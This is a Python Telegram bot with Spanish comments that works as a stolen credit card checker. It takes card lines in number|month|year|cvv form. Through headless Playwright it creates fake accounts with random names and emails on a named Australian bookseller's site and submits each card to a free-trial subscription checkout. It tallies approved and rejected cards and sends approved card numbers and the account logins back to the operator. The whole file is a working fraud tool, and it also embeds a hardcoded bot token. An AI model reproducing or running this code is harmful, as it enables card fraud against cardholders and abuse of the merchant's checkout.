import logging
import random
import string
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
from playwright.async_api import async_playwright

# Configuración del bot de Telegram
TOKEN = "7411833166:AAE7oKXCS0yXzFtY3RBW5ThBq4XnwhLEFyc"
ALLOWED_USERS = ["665151137"]  # Lista de usuarios permitidos (IDs de Telegram)

# Configuración de logging

# Listas de nombres y apellidos comunes
first_names = ["Juan", "Maria", "Carlos", "Laura", "Pedro", "Ana", "Luis", "Sofia", "Miguel", "Lucia"]
last_names = ["Gomez", "Perez", "Lopez", "Martinez", "Rodriguez", "Hernandez", "Garcia", "Fernandez", "Ruiz", "Diaz"]

# Función para generar correos aleatorios con dominio Gmail
def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

# Función para generar nombres aleatorios de personas comunes
def generate_random_name():
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

# Función para generar contraseñas aleatorias
def generate_random_password():
    password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return password

# Función para manejar el comando /chk
async def chk(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    
    # Verificar si el usuario está permitido
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("No tienes permiso para usar este bot.")
        return
    
    # Solicitar las tarjetas al usuario
    await update.message.reply_text("Por favor, envía las tarjetas en el siguiente formato:")

# Función para procesar los datos de las tarjetas
async def process_card_data(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    
    # Verificar si el usuario está permitido
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("No tienes permiso para usar este bot.")
        return
    
    # Obtener el mensaje del usuario
    card_data_list = update.message.text.split('\n')  # Separar las tarjetas por líneas
    
    # Enviar un mensaje inicial con el estado de las tarjetas
    message = await update.message.reply_text(
        "🔄 Procesando tarjeta 1 de {}...\n"
        "Número: ...\n"
        "Estado: Procesando...\n"
        "🦠 Aprobadas: 0\n"
        "❌ Rechazadas: 0".format(len(card_data_list))
    )

    # Ejecutar el proceso de pago con las tarjetas
    resultado = await process_payments(card_data_list, update, context, message.message_id)
    
    # Enviar el resultado final al usuario
    await update.message.reply_text(resultado)

# Función para realizar el proceso de pago con Playwright
async def process_payments(card_data_list, update, context, message_id):
    resultados = []
    tarjetas_restantes = card_data_list.copy()  # Copia de la lista de tarjetas
    aprobadas = 0
    rechazadas = 0

    while tarjetas_restantes:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)  # Abre el navegador visible
            context_browser = await browser.new_context()
            page = await context_browser.new_page()

            # Datos de la dirección y titular de la tarjeta
            direccion = "123 Main St, Sydney, Australia"
            codigo_postal = "5700"
            titular_tarjeta = "Juan Pérez"

            # Abrir la página
            await page.goto("https://www.booktopia.com.au/manage-subscriptions.ep")

            # Rellenar el formulario con datos aleatorios
            email = generate_random_email()
            await page.fill('input#j_username', email)
            await page.click('button#submitEmail')

            first_name, last_name = generate_random_name()
            await page.fill('input#firstName', first_name)
            await page.fill('input#lastName', last_name)

            password = generate_random_password()
            await page.fill('input#clearTextPassword', password)

            # Hacer clic en el botón de "Sign Up"
            await page.click('button#createAccountFormInput')
            
            # Esperar hasta que se muestre el apartado "My Subscriptions"
            await page.wait_for_selector("h2:text('My Subscriptions')", timeout=15000)

            # Hacer clic en "Start Free Trial"
            await page.wait_for_selector("a.if-signed-in.b-trigger.mb-3")
            await page.click("a.if-signed-in.b-trigger.mb-3")

            # Esperar a que cargue el nuevo botón de "Start Free Trial"
            await page.wait_for_selector("button.btn.btn-green1")
            await page.click("button.btn.btn-green1")

            # Completar la dirección
            await page.wait_for_selector("#newAddress\\.street1")
            await page.fill("#newAddress\\.street1", direccion)
            await asyncio.sleep(2)

            await page.keyboard.press("Tab")
            await page.click("[name='newAddress.zipOrPostalCode']")  # Hacer clic en el campo
            await page.type("[name='newAddress.zipOrPostalCode']", codigo_postal, delay=100)  # Escribir con una pequeña pausa entre caracteres



            # Procesar las tarjetas
            for card_data in tarjetas_restantes.copy():
                try:
                    # Verificar el formato de la tarjeta
                    if not card_data.strip():
                        continue  # Ignorar líneas vacías
                    
                    card_parts = card_data.split('|')
                    if len(card_parts) != 4:
                        resultados.append(f"Formato incorrecto: {card_data}")
                        tarjetas_restantes.remove(card_data)  # Eliminar tarjeta inválida
                        continue
                    
                    # Extraer los datos de la tarjeta
                    numero_tarjeta, mes_expiracion, año_expiracion, cvv = card_parts
                    ultimos_digitos = numero_tarjeta[-4:]  # Últimos 4 dígitos de la tarjeta

                    # Actualizar el mensaje con el estado actual
                    await context.bot.edit_message_text(
                        chat_id=update.message.chat_id,
                        message_id=message_id,
                        text="🔄 Procesando tarjeta {} de {}...\n"
                             "Número: ...{}\n"
                             "Estado: Procesando...\n"
                             "🦠 Aprobadas: {}\n"
                             "❌ Rechazadas: {}".format(
                            len(card_data_list) - len(tarjetas_restantes) + 1,
                            len(card_data_list),
                            ultimos_digitos,
                            aprobadas,
                            rechazadas
                        )
                    )

                    # Completar los datos de la tarjeta en el formulario
                    await page.fill("#orderPayment\\.cardHolderName", titular_tarjeta)
                    await page.fill("#orderPayment\\.cardNumber", numero_tarjeta)
                    await page.select_option("#orderPayment\\.expiryMonth", mes_expiracion)
                    
                    # Extraer los últimos dos dígitos del año si es necesario
                    if len(año_expiracion) == 4:  # Si el año tiene 4 dígitos (por ejemplo, 2028)
                        año_expiracion = año_expiracion[-2:]  # Extraer los últimos dos dígitos (28)

                    await page.select_option("#expiryYearField", año_expiracion)
                    await page.fill("#orderPayment\\.cvv2Code", cvv)
                    
                    await asyncio.sleep(2)

                    # Hacer clic en el botón de Checkout
                    await page.click("#checkout-subscription")

                    # Verificar si aparece el mensaje de error "Uh oh... We're doing some upgrading..."
                    try:
                        await page.wait_for_selector("text=Uh oh... We're doing some upgrading...", timeout=3000)
                        # Si aparece el mensaje, termina la ejecución y reinicia el proceso con las tarjetas restantes
                        await update.message.reply_text("La página está en mantenimiento. Reiniciando el proceso con las tarjetas restantes.")
                        break
                    except:
                        # Verificar si la tarjeta fue aprobada o rechazada
                        try:
                            await page.wait_for_selector("li:text('Your card details were rejected and your order has not been submitted.')", timeout=3000)
                            rechazadas += 1
                            tarjetas_restantes.remove(card_data)  # Eliminar tarjeta rechazada
                        except:
                            try:
                                await page.wait_for_selector("h1.col-12:has-text('Thank you for placing your order. Your free trial starts now.')", timeout=3000)
                                aprobadas += 1
                                tarjetas_restantes.remove(card_data)  # Eliminar tarjeta aprobada
                                await update.message.reply_text(f"✅ Tarjeta {numero_tarjeta} aprobada.\nDatos de la cuenta:\nCorreo :{email}\nContraseña:{password}")
                                break  # Salir del bucle y reiniciar el proceso
                            except:
                                tarjetas_restantes.remove(card_data)  # Eliminar tarjeta con estado indeterminado
                except Exception as e:
                    resultados.append(f"Error al procesar la tarjeta {card_data}: {e}")
                    tarjetas_restantes.remove(card_data)  # Eliminar tarjeta con error

            # Cerrar el navegador después de procesar las tarjetas
            await browser.close()

    # Filtrar las tarjetas rechazadas de los resultados
    resultados = [result for result in resultados if "Rechazada" not in result]

    # Devolver los resultados como un solo mensaje
    return "\n".join(resultados)

# Configuración de la aplicación de Telegram
def main():
    application = Application.builder().token(TOKEN).build()

    # Registrar los handlers
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_card_data))

    # Ejecutar el bot
    application.run_polling()

# Ejecutar el bot
if __name__ == "__main__":
    main()
